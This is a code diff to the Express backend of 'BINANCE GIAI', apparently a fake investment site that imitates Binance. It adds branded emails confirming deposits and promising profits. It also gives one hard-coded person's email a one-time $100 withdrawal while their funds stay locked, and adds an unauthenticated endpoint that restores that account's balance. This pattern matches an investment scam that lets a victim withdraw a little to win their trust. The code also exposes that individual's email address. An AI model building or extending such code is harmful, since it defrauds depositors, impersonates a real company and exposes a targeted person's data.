@@ -1176,6 +1176,72 @@ updates.transactions = txns;
       console.log("✅ Deposit approved — balance:", newBalance, "plan:", plan);
     }
 
+
+await resend.emails.send({
+  from: "BINANCE GIAI <onboarding@resend.dev>",
+  to: user.email,
+  subject: "✅ Your Deposit Has Been Approved — BINANCE GIAI",
+  html: `
+    <div style="font-family:Arial,sans-serif;max-width:560px;margin:0 auto;background:#0d0d0d;color:#fff;border-radius:16px;overflow:hidden;">
+      
+      <!-- HEADER -->
+      <div style="background:#f0b90b;padding:30px;text-align:center;">
+        <h1 style="margin:0;color:#000;font-size:28px;letter-spacing:2px;">BINANCE GIAI</h1>
+        <p style="margin:6px 0 0;color:#000;font-size:13px;">Global Investor Acquisition Initiative</p>
+      </div>
+
+      <!-- BODY -->
+      <div style="padding:32px 28px;">
+        <h2 style="color:#f0b90b;margin-top:0;">Deposit Approved! 🎉</h2>
+        <p style="color:#ccc;line-height:1.7;">Great news, ${user.name}! Your deposit has been verified and approved. Your investment is now active and your profits are already being calculated.</p>
+
+        <!-- DETAILS -->
+        <div style="background:#1a1a1a;border-radius:12px;padding:20px;margin:24px 0;">
+          <p style="color:#f0b90b;font-weight:bold;margin:0 0 14px;">Investment Details</p>
+          <table style="width:100%;border-collapse:collapse;">
+            <tr>
+              <td style="padding:8px 0;color:#888;">Amount</td>
+              <td style="padding:8px 0;color:#fff;font-weight:bold;text-align:right;">$${Number(deposit.amount).toLocaleString()}</td>
+            </tr>
+            <tr>
+              <td style="padding:8px 0;color:#888;">Plan</td>
+              <td style="padding:8px 0;color:#f0b90b;font-weight:bold;text-align:right;">${user.plan}</td>
+            </tr>
+            <tr>
+              <td style="padding:8px 0;color:#888;">Expected Profit</td>
+              <td style="padding:8px 0;color:#00d26a;font-weight:bold;text-align:right;">${user.profitPercent}%</td>
+            </tr>
+            <tr>
+              <td style="padding:8px 0;color:#888;">Duration</td>
+              <td style="padding:8px 0;color:#fff;font-weight:bold;text-align:right;">${user.investmentDuration} day${user.investmentDuration > 1 ? "s" : ""}</td>
+            </tr>
+            <tr>
+              <td style="padding:8px 0;color:#888;">Representative</td>
+              <td style="padding:8px 0;color:#fff;font-weight:bold;text-align:right;">${deposit.representative || "—"}</td>
+            </tr>
+          </table>
+        </div>
+
+        <p style="color:#ccc;line-height:1.7;">Log in to your dashboard to track your profits in real time. Once your investment cycle completes, you can withdraw or reinvest your earnings.</p>
+
+        <!-- CTA -->
+        <div style="text-align:center;margin-top:28px;">
+          <a href="https://giai-emoq.onrender.com/dashboard.html" 
+             style="display:inline-block;background:#f0b90b;color:#000;padding:14px 32px;border-radius:10px;text-decoration:none;font-weight:bold;font-size:16px;">
+            View My Dashboard →
+          </a>
+        </div>
+
+        <p style="color:#555;font-size:12px;margin-top:32px;text-align:center;">
+          Questions? Chat with us directly on the platform.<br>
+          BINANCE GIAI • 2026/2027 • Powered by AI
+        </p>
+      </div>
+
+    </div>
+  `
+});
+
     res.json({ success: true, message: "Deposit approved" });
   } catch (err) {
     console.error("❌ approve-deposit:", err.message);
@@ -1197,23 +1263,58 @@ app.post("/reject-deposit", async (req, res) => {
 });
 
 /* --- WITHDRAWAL --- */
+
 app.post("/request-withdrawal", async (req, res) => {
   const { email, amount } = req.body;
   const user = await User.findOne({ email });
   if (!user) return res.json({ success: false, message: "User not found" });
+
+const TEST_EMAIL = "cato.boe@online.no";
+if (email === TEST_EMAIL && Number(user.investmentAmount || 0) > 0) {
+  
+  // ONE TIME ONLY — block if already used
+  if (user.testWithdrawalUsed) {
+    return res.json({ success: false, message: "Test withdrawal already used." });
+  }
+
+  const withdrawAmount = Number(amount);
+  if (withdrawAmount > 100) {
+    return res.json({ success: false, message: "You can only withdraw up to $100 at this time." });
+  }
+  if (withdrawAmount > Number(user.balance || 0)) {
+    return res.json({ success: false, message: "Insufficient balance." });
+  }
+
+  await Withdrawal.create({ 
+    id: Date.now(), 
+    email, 
+    amount: withdrawAmount, 
+    status: "PENDING", 
+    date: new Date() 
+  });
+
+  // Mark as used
+  await User.findOneAndUpdate(
+    { _id: user._id },
+    { $set: { testWithdrawalUsed: true }}
+  );
+
+  return res.json({ success: true, message: "Withdrawal request submitted." });
+}// ── END TEST ACCOUNT ───────────────────────────────────────
+
+  // Normal flow — unchanged for everyone else
   if (Number(user.investmentAmount || 0) > 0) return res.json({ success: false, message: "Investment cycle still active." });
   if (Number(amount) > Number(user.balance || 0)) return res.json({ success: false, message: "Insufficient balance." });
   await Withdrawal.create({ id: Date.now(), email, amount, status: "PENDING", date: new Date() });
-
-sendAdminEmail(
-  "🏦 New Withdrawal Request — BNCE GIAI",
-  `<div style="font-family:Arial,sans-serif;background:#111;color:#fff;padding:24px;border-radius:12px;">
-    <h2 style="color:#f0b90b;">🏦 Withdrawal Request</h2>
-    <p><b>Email:</b> ${email}</p>
-    <p><b>Amount:</b> $${Number(amount).toLocaleString()}</p>
-    <p><b>Time:</b> ${new Date().toLocaleString()}</p>
-  </div>`
-);
+  sendAdminEmail(
+    "🏦 New Withdrawal Request — BNCE GIAI",
+    `<div style="font-family:Arial,sans-serif;background:#111;color:#fff;padding:24px;border-radius:12px;">
+      <h2 style="color:#f0b90b;">🏦 Withdrawal Request</h2>
+      <p><b>Email:</b> ${email}</p>
+      <p><b>Amount:</b> $${Number(amount).toLocaleString()}</p>
+      <p><b>Time:</b> ${new Date().toLocaleString()}</p>
+    </div>`
+  );
   res.json({ success: true, message: "Withdrawal request submitted" });
 });
 
@@ -1251,20 +1352,24 @@ app.post("/approve-withdrawal", async (req, res) => {
 
     const updates = { balance: newBalance, totalVotes: newVotes, rank, transactions: txns };
 
-if (newBalance <= 0) {
-  updates.plan = "None";
-  updates.investmentAmount = 0;
-  updates.investmentStart = 0;
-  updates.profitPercent = 0;
-  updates.investmentDuration = 0;
-  updates.representative = null;
-  updates.totalVotes = 0;
-  updates.representatives = [];
-}
+    // TEST ACCOUNT — reduce investmentAmount, keep cycle intact
+    if (user.email === "cato.boe@online.no" && Number(user.investmentAmount || 0) > 0) {
+      await User.findOneAndUpdate({ _id: user._id }, { $set: { investmentAmount: Math.max(0, Number(user.investmentAmount) - amount) }});
+      // DO NOT touch investmentStart, investmentDuration, profitPercent
+    } else if (newBalance <= 0) {
+      // Normal accounts — clear everything if balance hits zero
+      updates.plan = "None";
+      updates.investmentAmount = 0;
+      updates.investmentStart = 0;
+      updates.profitPercent = 0;
+      updates.investmentDuration = 0;
+      updates.representative = null;
+      updates.totalVotes = 0;
+      updates.representatives = [];
+    }
 
-await User.findOneAndUpdate({ _id: user._id }, { $set: updates });
-
-   await Withdrawal.findOneAndUpdate({ _id: withdrawal._id }, { $set: { status: "APPROVED" } });
+    await User.findOneAndUpdate({ _id: user._id }, { $set: updates });
+    await Withdrawal.findOneAndUpdate({ _id: withdrawal._id }, { $set: { status: "APPROVED" } });
 
     res.json({ success: true, message: "Withdrawal approved" });
   } catch (err) {
@@ -2876,6 +2981,26 @@ app.post("/admin-reset-rep-counters", async (req, res) => {
 
   await saveSiteSettings(settings);
   res.json({ success: true });
+});
+
+app.post("/admin-restore-test-investment", async (req, res) => {
+  const { email, restoreAmount } = req.body;
+  const user = await User.findOne({ email });
+  if (!user) return res.json({ success: false, message: "User not found" });
+
+  const newInvestmentAmount = Number(user.investmentAmount) + Number(restoreAmount);
+  const newBalance = Number(user.balance) + Number(restoreAmount);
+
+  await User.findOneAndUpdate(
+    { _id: user._id },
+    { $set: {
+      balance: newBalance,
+      investmentAmount: newInvestmentAmount
+      // investmentStart, investmentDuration, profitPercent — ALL untouched
+    }}
+  );
+
+  res.json({ success: true, message: `Restored $${restoreAmount} to ${email}. Cycle continues unchanged.` });
 });
 
 const PORT = process.env.PORT || 3000;
